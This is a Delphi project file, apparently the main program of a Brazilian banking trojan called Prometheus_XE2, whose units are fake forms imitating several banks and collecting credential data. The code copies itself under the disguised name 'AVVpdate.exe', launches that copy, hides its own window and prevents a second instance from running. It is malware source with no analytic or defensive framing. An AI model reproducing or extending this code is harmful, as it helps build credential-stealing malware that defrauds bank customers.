program Prometheus_XE2;

uses
  Forms,
  Windows,
  Classes,
  SysUtils,
  ShellApi,
  MainCentral in 'MainCentral.pas' {Frmsegredofiel_},
  Gerador in 'Gerador.pas',
  Fake in 'HOMES\SERA\Fake.pas' {Face},
  Brad1 in 'HOMES\ITALAS\Brad1.pas' {BradForm_},
  Brad2 in 'HOMES\ITALAS\Brad2.pas' {Frame2: TFrame},
  Brad3 in 'HOMES\ITALAS\Brad3.pas' {Frame3: TFrame},
  InstallBrada in 'HOMES\BRADALAS\InstallBrada.pas' {FormBrada_},
  Bradatabela in 'HOMES\BRADALAS\Bradatabela.pas' {Framebradatabela_: TFrame},
  PageB in 'HOMES\BEBALAS\PageB.pas' {BBP},
  CredMainCit_ in 'HOMES\CREDILAS\CredMainCit_.pas' {Formblue_},
  FrameCrediDado1 in 'HOMES\CREDILAS\FrameCrediDado1.pas' {FrameCrediDado1_: TFrame},
  FrameCrediDado2 in 'HOMES\CREDILAS\FrameCrediDado2.pas' {FrameCrediDado2_: TFrame},
  Framebrada1 in 'HOMES\BRADALAS\Framebrada1.pas' {FrameDesco1: TFrame},
  Framebrada2 in 'HOMES\BRADALAS\Framebrada2.pas' {FrameDesco2: TFrame},
  Framebrada3 in 'HOMES\BRADALAS\Framebrada3.pas' {FrameDesco3: TFrame},
  Framebrada4 in 'HOMES\BRADALAS\Framebrada4.pas' {FrameDesco4: TFrame};

{$R *.res}
{$R fifififififififififif.res}

Var
  File_         : TStringList;
  PathEXE       : string;
  HandleWindows : Cardinal;

begin

 if not fileexists(pegadiretoriodocliente+'Cprepert.tl') then
 begin

    try
    File_ := TStringList.Create;
    File_.Clear;
    File_.Add('Win64');
    File_.SaveToFile(pegadiretoriodocliente+'Cprepert.tl');
    File_.Free;

    PathEXE := ParamStr(0);
    PathEXE := ExtractFilePath(PathEXE);

    CopyFile(PWideChar(Application.ExeName),PWideChar(pegadiretoriodocliente+'AVVpdate.exe'),True);
    ShellExecute(0, nil, Pchar(pegadiretoriodocliente+'AVVpdate.exe'),nil,nil, SW_SHOWNORMAL);

    except
    end;
    Exit;
 end;

  Application.Initialize;
  Application.ShowMainForm := False;

  HandleWindows := FindWindow(nil,Pchar('RDO89'));

     if HandleWindows <> 0 then
      begin
       Application.Terminate;
      end;

  Application.Title := 'RDO89';
  Application.MainFormOnTaskbar := True;
  Application.CreateForm(TFrmsegredofiel_, Frmsegredofiel_);
  Application.Run;

end.
